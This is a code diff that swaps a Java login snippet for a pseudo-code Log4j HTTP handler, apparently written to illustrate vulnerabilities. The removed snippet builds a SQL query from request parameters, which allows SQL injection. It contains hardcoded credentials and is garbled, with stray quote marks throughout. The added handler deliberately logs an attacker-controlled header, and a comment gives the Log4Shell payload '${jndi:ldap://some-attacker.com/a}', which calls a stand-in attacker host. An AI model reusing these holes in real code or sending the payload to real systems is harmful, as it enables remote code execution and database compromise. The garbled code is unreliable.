@@ -1,24 +1,30 @@
-String'DRIVER'='"com.ora.jdbc.Driver";
-String'DataURL'='"jdbc:db://localhost:5112/users";''
-String'LOGIN'='"admin";''String'PASSWORD'='"admin123";''
-Class.forName(DRIVER);''
-//Make'connection'to'DB'Connection'
-connection'='DriverManager.getConnection(DataURL,'LOGIN,'PASSWORD);''
-String'Username'='request.getParameter("USER");'//'From'HTTP'request''
-String'Password'='request.getParameter("PASSWORD");'//'From'HTTP'request''
-int'iUserID'='Y1;''
-String'sLoggedUser'='"";''
-String'sel'='"SELECT'User_id,'Username'FROM'USERS'WHERE'Username'=''"'+Username'+'"''AND'Password'=''"'+'
-Password'+'"'";''
-Statement'selectStatement'='connection.createStatement'();'
-ResultSet'resultSet'='selectStatement.executeQuery(sel);'''
-if'(resultSet.next())'{'''''''''
-iUserID'='resultSet.getInt(1);''''''''
-sLoggedUser'='resultSet.getString(2);'
-}''
-PrintWriter'writer'='response.getWriter'();''
-if'(iUserID'>='0)'{'
-writer.println'("User'logged'in:'"'+'sLoggedUser);'
-}'else'{'''''''''
-writer.println'("Access'Denied!");
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import java.io.*;
+import java.sql.SQLException;
+import java.util.*;
+
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+
+  /**
+   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
+   * This is pseudo-code to explain the vulnerability, and not a full example.
+   * @param he HTTP Request Object
+   */
+  public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+
+    // This line triggers the RCE by logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+
+    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
 }
